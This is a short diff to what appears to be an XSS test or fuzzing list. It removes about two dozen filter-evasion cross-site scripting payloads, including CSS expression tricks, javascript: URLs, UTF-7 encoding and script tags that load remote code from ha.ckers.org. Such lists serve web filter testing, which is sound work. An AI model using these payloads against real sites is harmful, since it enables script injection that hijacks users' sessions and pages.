@@ -48,27 +48,3 @@ SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#10
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 <DIV STYLE="width: expression(alert('XSS'));">
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
-exp/*<XSS STYLE='no\xss:noxss("*//*");
-<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
-<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
-<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
-<BASE HREF="javascript:alert('XSS');//">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
-<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
-getURL("javascript:alert('XSS')")
-a="get";
-<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
-<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
-<HTML><BODY>
-<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
-<? echo('<SCR)';
-<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
-<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
